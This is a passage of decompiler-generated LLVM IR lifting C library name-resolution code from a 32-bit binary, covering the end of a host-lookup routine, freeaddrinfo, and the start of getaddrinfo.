  %v0_805dafb = load i32, i32* %eax.global-to-local, align 4
  %v2_805dafb = add i32 %v1_805daf8, -12
  %v3_805dafb = inttoptr i32 %v2_805dafb to i32*
  store i32 %v0_805dafb, i32* %v3_805dafb, align 4
  %v0_805dafc = load i32, i32* @ebx, align 4
  %v1_805dafc = add i32 %v0_805dafc, 20
  br label %dec_label_pc_805daff

dec_label_pc_805daff:                             ; preds = %dec_label_pc_805dada, %dec_label_pc_805dae3
  %v1_805daff = phi i32 [ %v2_805dadd, %dec_label_pc_805dada ], [ %v2_805dafb, %dec_label_pc_805dae3 ]
  %storemerge10 = phi i32 [ %v1_805dade, %dec_label_pc_805dada ], [ %v1_805dafc, %dec_label_pc_805dae3 ]
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_805daff = add i32 %v1_805daff, -4
  %v3_805daff = inttoptr i32 %v2_805daff to i32*
  store i32 %storemerge10, i32* %v3_805daff, align 4
  %v5_805db00 = call i32 @memcpy(i16* %v4_805db25, i32 %stack_var_-132.0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805db00, i32* %eax.global-to-local, align 4
  %v0_805db05 = load i32, i32* @esi, align 4
  %v1_805db05 = add i32 %v0_805db05, 12
  %v2_805db05 = inttoptr i32 %v1_805db05 to i32*
  %v3_805db05 = load i32, i32* %v2_805db05, align 4
  store i32 %v3_805db05, i32* %eax.global-to-local, align 4
  %v1_805db0b = trunc i32 %v3_805db05 to i16
  %v2_805db0b = load i32, i32* @ebx, align 4
  %v3_805db0b = add i32 %v2_805db0b, 2
  %v4_805db0b = inttoptr i32 %v3_805db0b to i16*
  store i16 %v1_805db0b, i16* %v4_805db0b, align 2
  %v0_805db0f = load i32, i32* @edi, align 4
  %v1_805db0f = add i32 %v0_805db0f, 24
  %v2_805db0f = inttoptr i32 %v1_805db0f to i32*
  %v3_805db0f = load i32, i32* %v2_805db0f, align 4
  store i32 %v3_805db0f, i32* %eax.global-to-local, align 4
  %v1_805db12 = load i32, i32* @ebx, align 4
  %v2_805db12 = add i32 %v1_805db12, 24
  %v3_805db12 = inttoptr i32 %v2_805db12 to i32*
  store i32 %v3_805db0f, i32* %v3_805db12, align 4
  br label %dec_label_pc_805db44

dec_label_pc_805db17:                             ; preds = %dec_label_pc_805da72
  %v0_805db1d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805db1d = load i32, i32* @esp, align 4
  %v2_805db1d = add i32 %v1_805db1d, -4
  %v3_805db1d = inttoptr i32 %v2_805db1d to i32*
  store i32 %v0_805db1d, i32* %v3_805db1d, align 4
  %v1_805db1e = add i32 %v1_805db1d, -8
  %v2_805db1e = inttoptr i32 %v1_805db1e to i32*
  store i32 4, i32* %v2_805db1e, align 4
  %v0_805db20 = load i32, i32* %eax.global-to-local, align 4
  %v2_805db20 = add i32 %v1_805db1d, -12
  %v3_805db20 = inttoptr i32 %v2_805db20 to i32*
  store i32 %v0_805db20, i32* %v3_805db20, align 4
  %v0_805db21 = load i32, i32* @ebx, align 4
  %v1_805db21 = add i32 %v0_805db21, 4
  store i32 %v1_805db21, i32* %eax.global-to-local, align 4
  %v2_805db24 = add i32 %v1_805db1d, -16
  %v3_805db24 = inttoptr i32 %v2_805db24 to i32*
  store i32 %v1_805db21, i32* %v3_805db24, align 4
  %v5_805db25 = call i32 @memcpy(i16* %v4_805db25, i32 %stack_var_-132.0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805db25, i32* %eax.global-to-local, align 4
  %v0_805db2a = load i32, i32* @esi, align 4
  %v1_805db2a = add i32 %v0_805db2a, 12
  %v2_805db2a = inttoptr i32 %v1_805db2a to i32*
  %v3_805db2a = load i32, i32* %v2_805db2a, align 4
  store i32 %v3_805db2a, i32* %eax.global-to-local, align 4
  %v1_805db30 = trunc i32 %v3_805db2a to i16
  %v2_805db30 = load i32, i32* @ebx, align 4
  %v3_805db30 = add i32 %v2_805db30, 2
  %v4_805db30 = inttoptr i32 %v3_805db30 to i16*
  store i16 %v1_805db30, i16* %v4_805db30, align 2
  %v0_805db34 = load i32, i32* @ebx, align 4
  %v1_805db34 = add i32 %v0_805db34, 8
  store i32 %v1_805db34, i32* @ebx, align 4
  %v0_805db37 = load i32, i32* @esp, align 4
  %v1_805db37 = add i32 %v0_805db37, -4
  %v2_805db37 = inttoptr i32 %v1_805db37 to i32*
  store i32 8, i32* %v2_805db37, align 4
  %v1_805db39 = add i32 %v0_805db37, -8
  %v2_805db39 = inttoptr i32 %v1_805db39 to i32*
  store i32 0, i32* %v2_805db39, align 4
  %v0_805db3b = load i32, i32* @ebx, align 4
  %v2_805db3b = add i32 %v0_805db37, -12
  %v3_805db3b = inttoptr i32 %v2_805db3b to i32*
  store i32 %v0_805db3b, i32* %v3_805db3b, align 4
  %v5_805db3c = call i32 @__GI_memset(i8* %v4_805db3c, i32 %stack_var_-132.0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805db3c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805db44

dec_label_pc_805db44:                             ; preds = %dec_label_pc_805daff, %dec_label_pc_805db17
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v3_805db47 = load i8*, i8** %stack_var_-148, align 4
  %v5_805db47 = icmp eq i8* %v3_805db47, null
  %v2_805db4e = load i32, i32* %v2_805da6a, align 4
  store i32 %v2_805db4e, i32* %edx.global-to-local, align 4
  br i1 %v5_805db47, label %dec_label_pc_805db79, label %dec_label_pc_805db52

dec_label_pc_805db52:                             ; preds = %dec_label_pc_805db44
  store i32 %storemerge15, i32* %ecx.global-to-local, align 4
  %v3_805db58 = add i32 %v2_805db4e, %v2_805db58
  store i32 %v3_805db58, i32* %eax.global-to-local, align 4
  %v2_805db5c = add i32 %v2_805db4e, 24
  %v3_805db5c = inttoptr i32 %v2_805db5c to i32*
  store i32 %v3_805db58, i32* %v3_805db5c, align 4
  %v0_805db5f = load i32, i32* %edx.global-to-local, align 4
  %v1_805db5f = load i32, i32* @esp, align 4
  %v2_805db5f = add i32 %v1_805db5f, -4
  %v3_805db5f = inttoptr i32 %v2_805db5f to i32*
  store i32 %v0_805db5f, i32* %v3_805db5f, align 4
  %v0_805db60 = load i32, i32* %edx.global-to-local, align 4
  %v2_805db60 = add i32 %v1_805db5f, -8
  %v3_805db60 = inttoptr i32 %v2_805db60 to i32*
  store i32 %v0_805db60, i32* %v3_805db60, align 4
  store i32 %stack_var_16.039, i32* %edx.global-to-local, align 4
  %v3_805db64 = load i8*, i8** %stack_var_-148, align 4
  %v4_805db64 = ptrtoint i8* %v3_805db64 to i32
  %v6_805db64 = add i32 %v1_805db5f, -12
  %v7_805db64 = inttoptr i32 %v6_805db64 to i32*
  store i32 %v4_805db64, i32* %v7_805db64, align 4
  %v0_805db6a = load i32, i32* %edx.global-to-local, align 4
  %v1_805db6a = inttoptr i32 %v0_805db6a to i32*
  %v2_805db6a = load i32, i32* %v1_805db6a, align 4
  store i32 %v2_805db6a, i32* @eax, align 4
  %v1_805db6c = add i32 %v2_805db6a, 24
  %v2_805db6c = inttoptr i32 %v1_805db6c to i32*
  %v3_805db6c = load i32, i32* %v2_805db6c, align 4
  %v5_805db6c = add i32 %v1_805db5f, -16
  %v6_805db6c = inttoptr i32 %v5_805db6c to i32*
  store i32 %v3_805db6c, i32* %v6_805db6c, align 4
  %v4_805db6f = call i32 @strcpy(i8* %v4_805db3c, i32 %stack_var_-132.0)
  store i32 %v4_805db6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805db80

dec_label_pc_805db79:                             ; preds = %dec_label_pc_805db44
  %v1_805db79 = add i32 %v2_805db4e, 24
  %v2_805db79 = inttoptr i32 %v1_805db79 to i32*
  store i32 0, i32* %v2_805db79, align 4
  br label %dec_label_pc_805db80

dec_label_pc_805db80:                             ; preds = %dec_label_pc_805db52, %dec_label_pc_805db79
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v2_805db83 = load i32, i32* %v2_805da6a, align 4
  store i32 %v2_805db83, i32* %eax.global-to-local, align 4
  %v1_805db85 = add i32 %v2_805db83, 28
  %v2_805db85 = inttoptr i32 %v1_805db85 to i32*
  store i32 0, i32* %v2_805db85, align 4
  %v0_805db8c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805db8c = inttoptr i32 %v0_805db8c to i32*
  %v2_805db8c = load i32, i32* %v1_805db8c, align 4
  %v1_805db8e = add i32 %v2_805db8c, 28
  store i32 %v1_805db8e, i32* %eax.global-to-local, align 4
  %v0_805db94 = load i32, i32* @esi, align 4
  %v1_805db94 = inttoptr i32 %v0_805db94 to i32*
  %storemerge9 = load i32, i32* %v1_805db94, align 4
  store i32 %storemerge9, i32* @esi, align 4
  %v1_805db96 = icmp eq i32 %storemerge9, 0
  %v1_805db98 = icmp eq i1 %v1_805db96, false
  br i1 %v1_805db98, label %dec_label_pc_805da47, label %dec_label_pc_805db96.dec_label_pc_805db9e_crit_edge

dec_label_pc_805db96.dec_label_pc_805db9e_crit_edge: ; preds = %dec_label_pc_805db80
  %v0_805db9e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805db9e

dec_label_pc_805db9e:                             ; preds = %dec_label_pc_805db96.dec_label_pc_805db9e_crit_edge, %dec_label_pc_805da3f
  %v0_805db9e = phi i32 [ %v0_805db9e.pre, %dec_label_pc_805db96.dec_label_pc_805db9e_crit_edge ], [ %v0_805da08, %dec_label_pc_805da3f ]
  %stack_var_16.0.lcssa = phi i32 [ %v1_805db8e, %dec_label_pc_805db96.dec_label_pc_805db9e_crit_edge ], [ %stack_var_16.150, %dec_label_pc_805da3f ]
  %v1_805db9e = inttoptr i32 %v0_805db9e to i32*
  %v2_805db9e = load i32, i32* %v1_805db9e, align 4
  store i32 %v2_805db9e, i32* @edi, align 4
  %v1_805dba0 = icmp eq i32 %v2_805db9e, 0
  %v1_805dba2 = icmp eq i1 %v1_805dba0, false
  br i1 %v1_805dba2, label %dec_label_pc_805d933, label %dec_label_pc_805dbd8

dec_label_pc_805dbaa:                             ; preds = %dec_label_pc_805d3f3, %dec_label_pc_805d307, %dec_label_pc_805d32b
  store i32 264, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbda

dec_label_pc_805dbb1:                             ; preds = %dec_label_pc_805d5b8, %dec_label_pc_805d52c
  store i32 6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbda

dec_label_pc_805dbb8:                             ; preds = %dec_label_pc_805d9e3, %dec_label_pc_805d85c, %dec_label_pc_805d60e
  store i32 258, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbda

dec_label_pc_805dbbf:                             ; preds = %dec_label_pc_805d9ae, %dec_label_pc_805d7ad, %dec_label_pc_805d6a3
  %v0_805dbbf = call i32 @__GI___h_errno_location()
  %v1_805dbc4 = inttoptr i32 %v0_805dbbf to i32*
  store i32 -1, i32* %v1_805dbc4, align 4
  store i32 11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbda

dec_label_pc_805dbd1:                             ; preds = %dec_label_pc_805da47
  store i32 10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbda

dec_label_pc_805dbd8:                             ; preds = %dec_label_pc_805db9e, %dec_label_pc_805d921, %dec_label_pc_805d917
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbda

dec_label_pc_805dbda:                             ; preds = %dec_label_pc_805d3d2, %dec_label_pc_805d345, %dec_label_pc_805d844, %dec_label_pc_805d307, %dec_label_pc_805dbd1, %dec_label_pc_805dbbf, %dec_label_pc_805dbb8, %dec_label_pc_805dbb1, %dec_label_pc_805dbaa, %dec_label_pc_805d852, %dec_label_pc_805dbd8
  %v0_805dbe1 = phi i32 [ %v2_805d35d, %dec_label_pc_805d345 ], [ 3, %dec_label_pc_805d844 ], [ 263, %dec_label_pc_805d307 ], [ 10, %dec_label_pc_805dbd1 ], [ 11, %dec_label_pc_805dbbf ], [ 258, %dec_label_pc_805dbb8 ], [ 6, %dec_label_pc_805dbb1 ], [ 264, %dec_label_pc_805dbaa ], [ 259, %dec_label_pc_805d852 ], [ 0, %dec_label_pc_805dbd8 ], [ %v2_805d3c6, %dec_label_pc_805d3d2 ]
  store i32 %v0_805d258, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805dbe1

; uselistorder directives
  uselistorder i32 %v2_805db9e, { 1, 2, 0 }
  uselistorder i32 %v1_805db8e, { 0, 2, 1 }
  uselistorder i32 %v2_805db4e, { 2, 1, 0, 3 }
  uselistorder i32* %v2_805da6a, { 4, 0, 3, 2, 1, 5 }
  uselistorder i32 %v2_805da5b, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_16.039, { 6, 7, 5, 4, 3, 2, 0, 1 }
  uselistorder i16* %v4_805db25, { 1, 0 }
  uselistorder i32 %v1_805da5b17, { 2, 4, 3, 5, 0, 1 }
  uselistorder i16 %storemerge11, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 1, 3, 2, 4, 0 }
  uselistorder i1 %v4_805da0e, { 1, 0 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %stack_var_-132.0, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v3_805d9f3, { 1, 0 }
  uselistorder i32 %v2_805d991, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805d969, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v1_805d95a, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v2_805d955, { 1, 0 }
  uselistorder i32 %v0_805d957, { 1, 0 }
  uselistorder i32 %v1_805d8da, { 1, 0, 2 }
  uselistorder i32 %v2_805d81b, { 1, 0 }
  uselistorder i32 %v0_805d7c5, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805d7a1, { 1, 0 }
  uselistorder i32 %v2_805d76f, { 1, 0 }
  uselistorder i32 %v3_805d73d, { 1, 0, 2 }
  uselistorder i32 %v0_805d728.pre, { 1, 0 }
  uselistorder i32 %v2_805d720, { 1, 0 }
  uselistorder i32 %v0_805d6c4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805d697, { 1, 0 }
  uselistorder i32 %v2_805d665, { 1, 0 }
  uselistorder i32 %v1_805d5d5, { 1, 0, 2 }
  uselistorder i1 %v2_805d58c, { 1, 0 }
  uselistorder i32 %v4_805d582, { 2, 3, 0, 5, 1, 4, 6 }
  uselistorder i32 %v5_805d576, { 1, 0, 2 }
  uselistorder i32 %v3_805d556, { 1, 0 }
  uselistorder i32 %v4_805d50c, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_805d508, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v8_805d4e4, { 1, 0 }
  uselistorder i32 %v1_805d4c6, { 1, 0 }
  uselistorder i32 %v0_805d4c6199, { 0, 3, 1, 2 }
  uselistorder i32 %v8_805d461, { 1, 0, 2, 3 }
  uselistorder i32 %v8_805d40b, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805d3ea, { 1, 0 }
  uselistorder i8 %v3_805d380, { 1, 0, 2 }
  uselistorder i32 %stack_var_-152.161, { 5, 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_805d46d, { 0, 2, 1, 3, 5, 4, 6, 7, 8 }
  uselistorder i32 %v3_805d2de, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v0_805d2cb206, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %v2_805d2de.pre-phi, { 1, 0 }
  uselistorder i1 %v1_805d2b5, { 1, 2, 0 }
  uselistorder i32 %v1_805d295, { 1, 0 }
  uselistorder i32* %v2_805d272, { 5, 6, 0, 4, 1, 3, 2, 7 }
  uselistorder i32* %stack_var_-176, { 3, 0, 6, 4, 7, 5, 8, 2, 9, 1, 10 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i8** %stack_var_-252, { 3, 2, 6, 5, 9, 8, 7, 4, 0, 1 }
  uselistorder i8** %stack_var_-32, { 12, 11, 5, 0, 10, 9, 4, 1, 8, 7, 3, 6, 2 }
  uselistorder i32* %stack_var_-24, { 0, 1, 2, 3, 4, 5, 6, 7, 20, 21, 22, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-28, { 2, 3, 6, 0, 4, 7, 1, 5, 8 }
  uselistorder i8** %stack_var_4, { 5, 4, 3, 0, 2, 1, 6 }
  uselistorder i8** %stack_var_-148, { 4, 3, 5, 2, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 51, 52, 20, 21, 22, 23, 24, 25, 49, 50, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 53, 47, 48 }
  uselistorder i32* %eax.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 22, 23, 24, 33, 19, 20, 21, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 62, 63, 82, 74, 75, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 0, 2, 76, 77, 78, 79, 149, 80, 81, 93, 94, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 1, 3, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 60, 122, 123, 124, 125, 126, 127, 130, 128, 129, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i32 264, { 1, 3, 0, 2 }
  uselistorder i32 -33, { 1, 0, 2, 3 }
  uselistorder i32 ()* @gethostbyname2_r, { 1, 0 }
  uselistorder i8* inttoptr (i32 2 to i8*), { 1, 0 }
  uselistorder i32 %arg3, { 20, 21, 19, 13, 14, 15, 16, 17, 18, 22, 23, 24, 25, 5, 6, 7, 8, 9, 10, 12, 11, 26, 27, 28, 0, 3, 4, 1, 2, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 %arg2, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_805dbda, { 10, 4, 5, 6, 7, 8, 9, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805dbaa, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805db80, { 1, 0 }
  uselistorder label %dec_label_pc_805db44, { 1, 0 }
  uselistorder label %dec_label_pc_805daff, { 1, 0 }
  uselistorder label %dec_label_pc_805da47, { 1, 0 }
  uselistorder label %dec_label_pc_805da08, { 1, 0 }
  uselistorder label %dec_label_pc_805d9e3, { 1, 0 }
  uselistorder label %dec_label_pc_805d933, { 1, 0 }
  uselistorder label %dec_label_pc_805d917, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805d8f2, { 1, 0 }
  uselistorder label %dec_label_pc_805d8ed, { 1, 0 }
  uselistorder label %dec_label_pc_805d8b5, { 1, 0 }
  uselistorder label %dec_label_pc_805d85c, { 4, 5, 1, 0, 3, 2, 6, 7 }
  uselistorder label %dec_label_pc_805d837, { 1, 0 }
  uselistorder label %dec_label_pc_805d7f2, { 1, 0 }
  uselistorder label %dec_label_pc_805d7da, { 1, 0 }
  uselistorder label %dec_label_pc_805d7ad, { 1, 0 }
  uselistorder label %dec_label_pc_805d73a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d738, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805d6f7, { 1, 0 }
  uselistorder label %dec_label_pc_805d6df, { 1, 0 }
  uselistorder label %dec_label_pc_805d6a3, { 1, 0 }
  uselistorder label %dec_label_pc_805d593, { 1, 0 }
  uselistorder label %dec_label_pc_805d543, { 1, 0 }
  uselistorder label %dec_label_pc_805d4d3, { 1, 0, 4, 5, 2, 3 }
  uselistorder label %dec_label_pc_805d4a2, { 1, 0 }
  uselistorder label %dec_label_pc_805d48b, { 1, 0 }
  uselistorder label %dec_label_pc_805d435, { 1, 0 }
  uselistorder label %dec_label_pc_805d3ea, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805d380, { 1, 0 }
  uselistorder label %dec_label_pc_805d323, { 1, 0 }
  uselistorder label %dec_label_pc_805d2db, { 1, 0 }
  uselistorder label %dec_label_pc_805d2ce.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805d29e, { 1, 0 }
}

define i32 @freeaddrinfo(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp18, i32* %stack_var_-12, align 4
  %v1_805dbfd2 = icmp eq i32 %arg1, 0
  %v1_805dbff9 = icmp eq i1 %v1_805dbfd2, false
  br i1 %v1_805dbff9, label %dec_label_pc_805dbec.lr.ph, label %dec_label_pc_805dc01

dec_label_pc_805dbec.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805dbec

dec_label_pc_805dbec:                             ; preds = %dec_label_pc_805dbec.lr.ph, %dec_label_pc_805dbec
  %v0_805dbef = phi i32 [ %arg1, %dec_label_pc_805dbec.lr.ph ], [ %v0_805dbf8, %dec_label_pc_805dbec ]
  %v1_805dbef = add i32 %v0_805dbef, 28
  %v2_805dbef = inttoptr i32 %v1_805dbef to i32*
  %v3_805dbef = load i32, i32* %v2_805dbef, align 4
  store i32 %v3_805dbef, i32* @ebx, align 4
  %v1_805dbf3 = call i32 @free(i32 %v0_805dbef)
  %v0_805dbf8 = load i32, i32* @ebx, align 4
  %v1_805dbfd = icmp eq i32 %v0_805dbf8, 0
  %v1_805dbff = icmp eq i1 %v1_805dbfd, false
  br i1 %v1_805dbff, label %dec_label_pc_805dbec, label %dec_label_pc_805dbfd.dec_label_pc_805dc01_crit_edge

dec_label_pc_805dbfd.dec_label_pc_805dc01_crit_edge: ; preds = %dec_label_pc_805dbec
  %v2_805dc01.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805dc01

dec_label_pc_805dc01:                             ; preds = %dec_label_pc_805dbfd.dec_label_pc_805dc01_crit_edge, %entry
  %v2_805dc01 = phi i32 [ %v2_805dc01.pre, %dec_label_pc_805dbfd.dec_label_pc_805dc01_crit_edge ], [ %tmp18, %entry ]
  ret i32 %v2_805dc01

; uselistorder directives
  uselistorder i32 %v0_805dbef, { 1, 0 }
  uselistorder label %dec_label_pc_805dbec, { 1, 0 }
}

define i32 @getaddrinfo(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-24 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %v0_805dc06 = load i32, i32* @edi, align 4
  %v0_805dc07 = load i32, i32* @esi, align 4
  %v0_805dc08 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v4_805dc1c = ptrtoint i8* %arg1 to i32
  %v5_805dc1c = icmp eq i8* %arg1, null
  br i1 %v5_805dc1c, label %dec_label_pc_805dc3c, label %dec_label_pc_805dc23

dec_label_pc_805dc23:                             ; preds = %entry
  store i32 %v4_805dc1c, i32* %eax.global-to-local, align 4
  %v2_805dc27 = load i8, i8* %arg1, align 1
  %v11_805dc27 = icmp eq i8 %v2_805dc27, 42
  %v1_805dc2a = icmp eq i1 %v11_805dc27, false
  br i1 %v1_805dc2a, label %dec_label_pc_805dc3c, label %dec_label_pc_805dc2c

dec_label_pc_805dc2c:                             ; preds = %dec_label_pc_805dc23
  %v1_805dc2c = add i32 %v4_805dc1c, 1
  %v2_805dc2c = inttoptr i32 %v1_805dc2c to i8*
  %v3_805dc2c = load i8, i8* %v2_805dc2c, align 1
  %v4_805dc2c = icmp eq i8 %v3_805dc2c, 0
  %v1_805dc30 = icmp eq i1 %v4_805dc2c, false
  %v1_805dc36 = sext i1 %v1_805dc30 to i32
  store i32 %v1_805dc36, i32* %eax.global-to-local, align 4
  %v17_805dc38 = select i1 %v1_805dc30, i8* %arg1, i8* null
  br label %dec_label_pc_805dc3c

dec_label_pc_805dc3c:                             ; preds = %dec_label_pc_805dc23, %entry, %dec_label_pc_805dc2c
  %v3_805dc87 = phi i8* [ %arg1, %dec_label_pc_805dc23 ], [ null, %entry ], [ %v17_805dc38, %dec_label_pc_805dc2c ]
  %v1_805dc3c = icmp eq i32 %arg2, 0
  br i1 %v1_805dc3c, label %dec_label_pc_805dc52, label %dec_label_pc_805dc40

dec_label_pc_805dc40:                             ; preds = %dec_label_pc_805dc3c
  %v1_805dc40 = inttoptr i32 %arg2 to i8*
  %v2_805dc40 = load i8, i8* %v1_805dc40, align 1
  %v11_805dc40 = icmp eq i8 %v2_805dc40, 42
  %v1_805dc43 = icmp eq i1 %v11_805dc40, false
  br i1 %v1_805dc43, label %dec_label_pc_805dc52, label %dec_label_pc_805dc45

dec_label_pc_805dc45:                             ; preds = %dec_label_pc_805dc40
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805dc47 = add i32 %arg2, 1
  %v2_805dc47 = inttoptr i32 %v1_805dc47 to i8*
  %v3_805dc47 = load i8, i8* %v2_805dc47, align 1
  %v4_805dc47 = icmp eq i8 %v3_805dc47, 0
  %v1_805dc4b = icmp eq i1 %v4_805dc47, false
  %v1_805dc4e = sext i1 %v1_805dc4b to i32
  store i32 %v1_805dc4e, i32* %eax.global-to-local, align 4
  %v2_805dc50 = select i1 %v1_805dc4b, i32 %arg2, i32 0
  store i32 %v2_805dc50, i32* @esi, align 4
  br label %dec_label_pc_805dc52

dec_label_pc_805dc52:                             ; preds = %dec_label_pc_805dc40, %dec_label_pc_805dc3c, %dec_label_pc_805dc45
  %v1_805dc56 = phi i32 [ %arg2, %dec_label_pc_805dc40 ], [ 0, %dec_label_pc_805dc3c ], [ %v2_805dc50, %dec_label_pc_805dc45 ]
  %v4_805dc52 = ptrtoint i8* %v3_805dc87 to i32
  %v2_805dc56 = or i32 %v1_805dc56, %v4_805dc52
  %v3_805dc56 = icmp eq i32 %v2_805dc56, 0
  br i1 %v3_805dc56, label %dec_label_pc_805de7f, label %dec_label_pc_805dc5e

dec_label_pc_805dc5e:                             ; preds = %dec_label_pc_805dc52
  %v1_805dc5e = icmp eq i32 %arg3, 0
  %v1_805dc60 = icmp eq i1 %v1_805dc5e, false
  br i1 %v1_805dc60, label %dec_label_pc_805dc76, label %dec_label_pc_805dc62

dec_label_pc_805dc62:                             ; preds = %dec_label_pc_805dc5e
  %v2_805dc67 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_805dc67, i32* @ebx, align 4
  %tmp113 = bitcast i32* %stack_var_-64 to i8*
  store i32 %v2_805dc67, i32* @edi, align 4
  %v6_805dc6e = call i32 @__GI_memset(i8* %tmp113, i32 0, i32 32)
  store i32 %v6_805dc6e, i32* %eax.global-to-local, align 4
  %v0_805dc76.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805dc76

dec_label_pc_805dc76:                             ; preds = %dec_label_pc_805dc5e, %dec_label_pc_805dc62
  %v0_805dc76 = phi i32 [ %arg3, %dec_label_pc_805dc5e ], [ %v0_805dc76.pre, %dec_label_pc_805dc62 ]
  %v1_805dc76 = inttoptr i32 %v0_805dc76 to i32*
  %v2_805dc76 = load i32, i32* %v1_805dc76, align 4
  store i32 %v2_805dc76, i32* %eax.global-to-local, align 4
  %v1_805dc78 = and i32 %v2_805dc76, -1088
  %v2_805dc78 = icmp eq i32 %v1_805dc78, 0
  %v1_805dc7d = icmp eq i1 %v2_805dc78, false
  br i1 %v1_805dc7d, label %dec_label_pc_805de86, label %dec_label_pc_805dc83

dec_label_pc_805dc83:                             ; preds = %dec_label_pc_805dc76
  %v2_805dc83 = and i32 %v2_805dc76, 2
  %v3_805dc83 = icmp eq i32 %v2_805dc83, 0
  br i1 %v3_805dc83, label %dec_label_pc_805dc92, label %dec_label_pc_805dc87

dec_label_pc_805dc87:                             ; preds = %dec_label_pc_805dc83
  %v5_805dc87 = icmp eq i8* %v3_805dc87, null
  br i1 %v5_805dc87, label %dec_label_pc_805de86, label %dec_label_pc_805dc92

dec_label_pc_805dc92:                             ; preds = %dec_label_pc_805dc87, %dec_label_pc_805dc83
  %v0_805dc92 = load i32, i32* @esi, align 4
  %v1_805dc92 = icmp eq i32 %v0_805dc92, 0
  br i1 %v1_805dc92, label %dec_label_pc_805dd05, label %dec_label_pc_805dc96

dec_label_pc_805dc96:                             ; preds = %dec_label_pc_805dc92
  %v1_805dc96 = inttoptr i32 %v0_805dc92 to i8*
  %v2_805dc96 = load i8, i8* %v1_805dc96, align 1
  %v3_805dc96 = icmp eq i8 %v2_805dc96, 0
  br i1 %v3_805dc96, label %dec_label_pc_805dd05, label %dec_label_pc_805dc9b

dec_label_pc_805dc9b:                             ; preds = %dec_label_pc_805dc96
  store i8* %v1_805dc96, i8** %stack_var_-32, align 4
  %v4_805dc9f = ptrtoint i32* %stack_var_-64 to i32
  %v2_805dca2 = ptrtoint i8** %stack_var_-24 to i32
  store i32 %v2_805dca2, i32* %eax.global-to-local, align 4
  %v6_805dca8 = call i32 @strtoul(i32 %v0_805dc92, i32 %v2_805dca2, i32 10, i32 %v4_805dc9f)
  %v3_805dcb4 = load i8*, i8** %stack_var_-24, align 4
  %v4_805dcb4 = ptrtoint i8* %v3_805dcb4 to i32
